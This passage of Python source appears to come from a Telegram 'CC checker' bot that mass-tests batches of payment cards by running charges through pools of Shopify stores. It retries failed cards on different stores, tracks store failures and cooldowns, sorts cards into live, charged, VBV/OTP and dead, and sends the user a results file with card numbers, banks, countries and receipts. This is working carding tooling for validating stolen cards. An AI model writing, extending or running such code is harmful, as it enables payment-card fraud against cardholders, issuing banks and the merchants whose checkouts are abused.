                    if result.status == CCStatus.ERROR and raw_code in INFRA_ERROR_CODES:
                        retries = retry_counts.get(card_key, 0)
                        if retries < MAX_RETRIES:
                            retry_counts[card_key] = retries + 1
                            new_skip = skip_stores | {store_url}  # avoid same store
                            await card_queue.put((card, new_skip))
                            logger.debug(
                                f"Card {card_key[-4:]} infra fail on {store_url} ({raw_code})"
                                f" — retry #{retries+1} on different store"
                            )
                        else:
                            # Max retries exceeded → count as error
                            await _collect_result(card, result, t0)
                        # Track store fail (may put it in cooldown)
                        try:
                            from gateways.shopify_gate import _track_infra_fail
                            await _track_infra_fail(store, raw_code)
                        except Exception:
                            pass
                        continue

                    # ── Product/delivery skip: re-queue on different store ────────
                    from gateways.shopify_gate import PRODUCT_ERROR_CODES
                    if result.status == CCStatus.ERROR and raw_code in PRODUCT_ERROR_CODES:
                        retries = retry_counts.get(card_key, 0)
                        if retries < MAX_RETRIES:
                            retry_counts[card_key] = retries + 1
                            new_skip = skip_stores | {store_url}
                            await card_queue.put((card, new_skip))
                        else:
                            await _collect_result(card, result, t0)
                        try:
                            from gateways.shopify_gate import _track_no_delivery_fail
                            await _track_no_delivery_fail(store, raw_code)
                        except Exception:
                            pass
                        continue

                    # ── Card-level result (decline/live/3ds) — collect and move on ─
                    retry_counts.pop(card_key, None)
                    await _collect_result(card, result, t0)

            # Launch N workers (capped at min(stores, 50))
            n_workers = total_concurrent
            all_worker_tasks = [
                asyncio.ensure_future(worker()) for _ in range(n_workers)
            ]
            _active_tasks[sess_key] = list(all_worker_tasks)

            try:
                await asyncio.gather(*all_worker_tasks, return_exceptions=True)
            except asyncio.CancelledError:
                for t in all_worker_tasks:
                    t.cancel()
                raise


        else:
            # ── FALLBACK: Standard semaphore approach for non-Shopify gates ──────
            sem = asyncio.Semaphore(fallback_workers)

            async def check_one(card):
                nonlocal last_edit_time
                if stop_event.is_set() or not _active_checks.get(sess_key, True):
                    return
                async with sem:
                    if stop_event.is_set() or not _active_checks.get(sess_key, True):
                        return
                    t0 = time.monotonic()
                    result = await route_and_check(card)
                    await _collect_result(card, result, t0)

            all_tasks = [asyncio.ensure_future(check_one(card)) for card in cards]
            _active_tasks[sess_key] = all_tasks
            await asyncio.gather(*all_tasks, return_exceptions=True)


        # Determine if was stopped BEFORE popping (False means user stopped it)
        was_stopped = not _active_checks.get(sess_key, True)
        _active_checks.pop(sess_key, None)
        _stop_events.pop(sess_key, None)
        _active_tasks.pop(sess_key, None)
        _session_owners.pop(sess_key, None)   # cleanup session owner
        elapsed = time.monotonic() - start
        await db.increment_check_count(msg.from_user.id)

        # Construct live cards list for progress formatter
        live_lines = []
        for r in charged_results:
            live_lines.append(f"{r['card']} [✅ LIVE] {r['scheme']} | {r['bank']} | {r['country']} | {r['response']} | {r['time']}")
        for r in vbv_results:
            live_lines.append(f"{r['card']} [🔐 VBV] {r['scheme']} | {r['bank']} | {r['country']} | {r['response']} | {r['time']}")

        # ── Final Summary ───────────────────────────────────────────────────────
        if was_stopped:
            final_text = (
                f"🛑 <b>𝕊𝕞𝕚𝕝𝕖 ℂ𝕙𝕖𝕔𝕜𝕖𝕣 𝕊𝕥𝕠𝕡𝕡𝕖𝕕 𝕓𝕪 𝕌𝕤𝕖𝕣!</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📊 <b>Progress:</b> <code>{done}/{total}</code>\n"
                f"✅ <b>Charged:</b> <code>{non_vbv_count}</code>\n"
                f"🔐 <b>VBV:</b> <code>{vbv_count}</code>\n"
                f"❌ <b>Dead:</b> <code>{dead_count}</code>\n"
                f"❓ <b>Error:</b> <code>{error_count}</code>\n"
                f"⏱️ <b>Time:</b> <code>{elapsed:.1f}s</code>"
            )
        else:
            final_text = format_mass_complete(
                total=total,
                live=live_count,
                dead=dead_count,
                vbv=vbv_count,
                non_vbv=non_vbv_count,
                errors=error_count,
                elapsed=elapsed,
                live_cards=live_lines,
            )
        await wait_msg.edit_text(final_text, parse_mode=enums.ParseMode.HTML)

        # ── Send results as .txt file ────────────────────────────────────────
        lines = [
            "=" * 60,
            "⚡ CC CHECKER PRO — MASS CHECK RESULTS" + (" (STOPPED BY USER)" if was_stopped else ""),
            f"📋 Total Checked: {done}/{total} | ✅ Charged: {non_vbv_count} | 🔐 VBV: {vbv_count} | ❌ Dead: {dead_count} | ❓ Error: {error_count}",
            f"⚡ Mode: {'Store-Pool' if use_store_pool else 'Standard'} | Parallel: {total_concurrent} | ⏱️ Time: {elapsed:.1f}s",
            "=" * 60,
            "",
        ]

        if charged_results:
            lines.append(f"✅ CHARGE APPROVED ({len(charged_results)} cards)")
            lines.append("-" * 60)
            for r in charged_results:
                receipt_str = f" | Receipt: {r['receipt_url']}" if r.get("receipt_url") else ""
                lines.append(f"{r['card']} | Status: {r['tag']} | Amount: {r['amount']} | Gate: {r['gateway']} | Response: {r['response']} | Info: {r['scheme']} | Bank: {r['bank']} | Country: {r['country']} | Time: {r['time']}{receipt_str}")
            lines.append("")

        if vbv_results:
            lines.append(f"🔐 VBV / OTP REQUIRED ({len(vbv_results)} cards)")
            lines.append("-" * 60)
            for r in vbv_results:
                lines.append(f"{r['card']} | Status: {r['tag']} | Amount: {r['amount']} | Gate: {r['gateway']} | Response: {r['response']} | Info: {r['scheme']} | Bank: {r['bank']} | Country: {r['country']} | Time: {r['time']}")
            lines.append("")

        if dead_results:
            lines.append(f"❌ DEAD / DECLINED ({len(dead_results)} cards)")
            lines.append("-" * 60)
            for r in dead_results:
                lines.append(f"{r['card']} | Amount: {r['amount']} | Gate: {r['gateway']} | Response: {r['response']} | Info: {r['scheme']} | Bank: {r['bank']} | Country: {r['country']} | Time: {r['time']}")
            lines.append("")

        if error_results:
            lines.append(f"❓ ERRORS ({len(error_results)} cards)")
            lines.append("-" * 60)
            for r in error_results:
                lines.append(f"{r['card']} | Amount: {r['amount']} | Gate: {r['gateway']} | Response: {r['response']} | Time: {r['time']}")
            lines.append("")

        results_text = "\n".join(lines)
        tmp_file = tempfile.NamedTemporaryFile(
            mode="w", suffix="_mass_results.txt",
            delete=False, encoding="utf-8"
        )
        tmp_file.write(results_text)
        tmp_file.close()

        try:
            caption = (
                f"⚡ **Mass Check Results" + (" (Stopped)" if was_stopped else "") + "**\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ **Charged:** `{non_vbv_count}`\n"
                f"🔐 **VBV:** `{vbv_count}`\n"
                f"❌ **Dead:** `{dead_count}`\n"
                f"📋 **Checked:** `{done}/{total}` | ⏱️ `{elapsed:.1f}s`"
            )
            file_name_txt = f"mass_results_stopped_{done}of{total}.txt" if was_stopped else f"mass_results_{total}cards.txt"
            await client.send_document(
                msg.chat.id,
                tmp_file.name,
                caption=caption,
                parse_mode=enums.ParseMode.MARKDOWN,
                file_name=file_name_txt,
            )
        finally:
            os.unlink(tmp_file.name)
